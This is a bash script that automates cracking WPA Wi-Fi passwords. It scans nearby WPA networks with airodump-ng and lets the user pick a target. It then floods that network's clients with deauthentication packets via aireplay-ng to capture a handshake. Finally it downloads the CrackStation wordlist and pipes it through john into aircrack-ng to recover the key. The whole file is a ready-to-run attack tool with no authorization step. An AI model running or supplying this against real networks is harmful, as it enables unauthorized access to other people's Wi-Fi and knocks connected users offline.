#!/bin/bash

#Colors vars
green_color="\033[1;32m"
green_color_title="\033[0;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
white_color="\e[1;97m"
normal_color="\e[1;0m"
bold=$(tput bold)
normal=$(tput sgr0)

xter=$(tput cols)
yter=$(tput lines)

monitor_interface=" "

#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function print_star() {
for print_star_i in $(seq 1 $xter)
do
	sleep 0.01 && echo -ne "${normal_color}*"
done
echo
}
#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function print_dash() {
echo -e "${normal_color}-------------------------------------"
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function print_dots() {
for dots_i in $(seq 1 4)
do
sleep 0.1 && echo -ne "${normal_color}."
done
}

#------------------------------------------------------------------------------------------------------------------------
function print_title() {
clear
declare -a title
title[0]="        __   __    _    ______          "
title[1]="       |  \ |  |  | |  |____  )         "
title[2]="       |   \|  |  | |    __/ /          "
title[3]="       | |\ \  |  | |   |___ \          "
title[4]="       | | \   |  | |  _____\ \         "
title[5]="       |_|  \__|  |_| |________)        "

space_before_title=$((($xter-40)/2))
for title_line in {1..6}
do
	for title_space in $(seq 1 $space_before_title)
	do
		echo -ne " "
	done
	for title_i in $(seq 1 40)
	do
		if [ "${title[$title_line-1]:title_i-1:1}" != " " ]
		then
			echo -ne "${yellow_color}Nitin"
			sleep 0.08
			echo -ne "\b\b\b\b\b"
		fi
		echo -ne "${red_color}${title[$title_line-1]:title_i-1:1}"
	done 
	echo -e "${normal_color}"
done
echo
print_star
}
#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function managed_mode() {
echo
echo
if [ "$monitor_interface" != " " ]
then
	echo -ne "${blue_color}Putting wireless interface in managed mode${normal_color}"
	print_dots
	throw="$(airmon-ng stop ${monitor_interface})" 2> /dev/null
	echo -e "${green_color}Done${normal_color}"
	echo
	echo
	echo -ne "${blue_color}Restarting your network manager"
	print_dots
	service network-manager restart
	echo -e "${green_color}Done${normal_color}"
fi
}

function exit_script_banner() {
echo
echo

echo -ne "${green_color}Script exited successfully...${normal_color}"
echo -e "     [${normal_color}Developed by:${pink_color}ni_three]"
sleep 0.5
print_star

exit
}


#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function exit_script() {
echo
echo
echo
echo -ne "${blue_color}Resetting everything${normal_color}"
print_dots
echo
print_star
managed_mode
exit_script_banner

}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function check_root() {
user=$(whoami)
if [ "$user" != "root" ]
then
	echo -e "${red_color}Error:${normal_color}You're not logged in as root"
	echo -e "${green_color}Required:${normal_color}Root Permissions"
	sleep 0.01
	exit_script
fi
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------


function tools_install() {
	echo
	echo
	echo -e "${blue_color}Installing essential tools${normal_color}"
	print_dash
	echo
	for install_item in ${tools_nf[@]}
	do
		echo -ne "${yellow_color}Installing ${install_item}"
		print_dots
		echo
		if [ "$install_item" = "xterm" ]
		then
			apt-get install xterm
		elif [ "$install_item" = "aircrack-ng" ]
		then
			apt-get install aircrack-ng
		elif [ "$install_item" = "john" ]
		then
			apt-get install john
		fi
		echo
		echo
	done
	check_tools
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------

function check_tools() {
declare -a tools=("awk" "ifconfig" "iwconfig" "aircrack-ng" "xterm" "john")
declare -a tools_nf=()
tools_req=0
echo
echo -e "${blue_color}Checking required tools...${normal_color}"
print_dash
for tools_item in ${tools[@]}
do
	echo -ne "${normal_color}${tools_item}"
	print_dots
	
	if ! hash ${tools_item} 2> /dev/null
	then
		echo -e "${red_color}Error${normal_color}"
		tools_nf[${tools_req}]="$tools_item"
		tools_req=$(($tools_req+1))
	else
		echo -e "${green_color}Ok${normal_color}"
	fi
done

	if [ $tools_req != 0 ]
	then
		tools_install
	else
		echo
		echo
		echo -e "${green_color}All essential tools are installed..."
		echo -e "${yellow_color}All set...${normal_color}"
		echo
		sleep 0.01
	fi
	echo -ne "${normal_color}Press [ENTER] to continue."
	read
}
#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function monitor_mode() {
	echo -ne "${blue_color}Putting your wireless card in monitor mode${normal_color}"
	print_dots
	throw="$(airmon-ng start ${wifi_interface})" 2> /dev/null
	echo -e "${green_color}Done"
	print_dash
	monitor_interface="$(ifconfig | grep "mon0" | cut -d " " -f 1)"
	echo -e "${normal_color}Interface in monitor mode: ${green_color}mon0${normal_color}"
	echo
	echo
	echo -ne "${normal_color}Press [ENTER] to continue."
	read
}


#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function detect_interfaces() {
	echo
	echo -ne "${blue_color}Detecting wireless interfaces${normal_color}"
	print_dots
	echo
	print_dash
	wifi_interface="$(ifconfig | grep "^w" | cut -d " " -f 1)"
	echo -e "${normal_color}Wireless interface found: ${green_color}${wifi_interface}${normal_color}"
	echo
	echo
}
#---------------------------------------------------------------------------------------------------------------------------------------------------------------

function dw_passwd() {

clear
echo -e "${yellow_color}Downloading a password list...${normal_color}"
sleep 2
echo
wget "https://crackstation.net/files/crackstation-human-only.txt.gz"
echo -e "${yellow_color}Extracting the password list...{normal_color}"
echo
gunzip crackstation-human-only.txt.gz


}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------

function aircrack_target() {

managed_mode
if ! [ -f crackstation-human-only.txt ]; then
	dw_passwd
fi

clear

echo
echo

xterm +j -geometry 100x30-0+0 -T "Cracking password for ${tc_name}" -e john --session=handshake --stdout --wordlist=crackstation-human-only.txt | aircrack-ng -w - -b ${tc_bssid} crack-01.cap

cp crack-01.cap handshake.cap
echo
echo
echo
echo -e "${pink_color}If you couldn't complete the password list... You can continue it by running following command in terminal:"
echo
echo -e "${normal_color}john --restore=handshake | aircrack-ng -w - -b ${tc_bssid} handshake.cap"
echo
sleep 2

exit_script_banner


}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------

function airodump_target() {
	clear
	rm -rf crack-01.*
	

	xterm +j -geometry 86x24-0+0 -T "Capture handshake" -e airodump-ng --bssid ${tc_bssid} -c ${tc_ch} --write crack ${monitor_interface} --ignore-negative-one &
	xterm +j -geometry 86x24+0+0 -T "Sending deauthentication packets" -e aireplay-ng --deauth 40 -a ${tc_bssid} ${monitor_interface} --ignore-negative-one 

	sleep 14	
	echo -e "${yellow_color}Close 'Capture handshake' window when you see ${pink_color}WPA Handshake: ${tc_bssid} ${yellow_color} in the top right corner of that window${normal_color}"
	echo
	echo
	echo -ne "${normal_color}Did you get the handshake? [y/n]  "
	read -r yn_hsk
	
	if [[ "$yn_hsk" = "y" ]] || [[ "$yn_hsk" = "Y" ]]
	then 
		aircrack_target
	else
		exit_script
	fi

}


#---------------------------------------------------------------------------------------------------------------------------------------------------------------


function choose_target() {

echo
echo
echo
echo -e "${green_color}Choose a target${normal_color}(Enter the corresponding no.)."
read -r target_choice

if [[ $target_choice -le $target_count ]] && [[ $target_choice -gt 0 ]]; then 
	tc_name="$(grep "^${target_choice}" targets.txt | cut -d "," -f 2)"
	tc_bssid="$(grep "^${target_choice}" targets.txt | cut -d "," -f 3)"
	tc_ch="$(grep "^${target_choice}" targets.txt | cut -d "," -f 4)"
	tc_power="$(grep "^${target_choice}" targets.txt | cut -d "," -f 6)"
	tc_cipher="$(grep "^${target_choice}" targets.txt | cut -d "," -f 5)"
	echo
	echo -e "${blue_color}Target Chosen Successfully${normal_color}"
	print_dash
	echo -e "${yellow_color}Name   :${normal_color}${tc_name}"
	echo -e "${yellow_color}MAC    :${normal_color}${tc_bssid}"
	echo -e "${yellow_color}Channel:${normal_color}${tc_ch}"
	echo -e "${yellow_color}Power  :${normal_color}${tc_power}"
	echo -e "${yellow_color}CIPHER :${normal_color}${tc_cipher}"
	echo -ne "${normal_color}Press [ENTER] to continue."
	read
	airodump_target
else
	echo
	echo -e "${red_color}Invalid Choice${normal_color}"
	echo -e "${normal_color}Press:\n${yellow_color}[e] ${normal_color}to exit the script\n${yellow_color}[ENTER] ${normal_color}to choose again"
	read -r ct_choice
	if [[ "$ct_choice" = "e" ]] || [[ "$ct_choice" = "E" ]]; then
		exit_script
	else
		print_targets
	fi
fi
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------

function print_targets() {
clear
print_star
echo -e "${green_color}No.   Target Name          Target MAC Address  CHANNEL POWER CIPHER"
#echo -e "${green_color}${print_t_header}"
echo -e "${normal_color}--------------------------------------------------------------------"
echo -e "$(awk -F, '{printf "%-5s %-20s %-18s %8d %5d %6s\n",$1,$2,$3,$4,$6,$5}' targets.txt)"

choose_target
}



#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function find_targets() {
clear
echo -ne "${blue_color}Finding targets${normal_color}"
print_dots
echo
echo -e "${yellow_color}Press [CTRL+C] after 15-20 seconds${normal_color}"
echo -ne "Press [ENTER] to continue."

read

rm -rf clients_csv.csv > /dev/null 2>&1
rm -rf targets_csv.csv > /dev/null 2>&1
rm -rf targets.txt > /dev/null 2>&1
rm -rf targets_sorted.txt > /dev/null 2>&1
rm -rf WPA*.*

xterm +j -geometry 86x24-0+0 -T "Finding Targets" -e airodump-ng ${monitor_interface} -w WPAcrack --encrypt "WPA"

sep_t_and_c=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' < "WPAcrack-01.csv")
sep_t_and_c=$((sep_t_and_c - 1))

head -n "${sep_t_and_c}" "WPAcrack-01.csv" &> "targets_csv.csv"
tail -n +"${sep_t_and_c}" "WPAcrack-01.csv" &> "clients_csv.csv"

targets=$(wc -l "targets_csv.csv" | awk '{ print $1 }')
targets=$((targets - 3))

clear

if [ $targets -eq 0 ]
then
	echo -e "${red_color}No targets found..."
	echo
	echo
	echo -e "${normal_color}Wanna try again?[y/n]"
	read -r try_again
	if [[ "$try_again" = "y" ]] || [[ "$try_again" = "Y" ]]
	then
		find_targets
	else
		exit_script
	fi
else
	target_count=0
	while IFS=, read -r target_mac _ _ target_ch _ target_encrypt _ _ target_power _ _ _ target_name_length target_name _; do
		mac_length=${#target_mac}
		if [ $mac_length -ge 17 ]
		then
			target_count=$(( target_count + 1 ))
			target_mac=$(echo -e "$target_mac" | awk '{print $1}')
		
			if [[ ${target_power} -le  0 ]]; then
				if [[ ${target_power} -eq -1 ]]; then
					target_power=0
				else
					target_power=$(( target_power + 100 ))
				fi
			fi
			
			target_power=$(echo -e "$target_power" | awk '{ gsub(/ /,""); print }')
			target_ch=$(echo -e "$target_ch" | awk '{gsub(/ /,""); print}')		
			target_name=${target_name:1:${target_name_length}}		
			target_encrypt=$(echo -e "$target_encrypt" | awk '{print $1}')
					
			echo -e "$target_count,$target_name,${target_mac},$target_ch,$target_encrypt,$target_power" >> "targets.txt"
		
		fi
	done < "targets_csv.csv"	
	
	#sort -t "," -d -k 1 "targets.txt" > "targets_sorted.txt"
	
	print_targets
fi


}



#---------------------------------------------------------------------------------------------------------------------------------------------------------------
function starthere() {
print_title
check_root
check_tools
detect_interfaces
throw="$(airmon-ng check kill)" 2> /dev/null
monitor_mode
find_targets

exit_script
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------

starthere
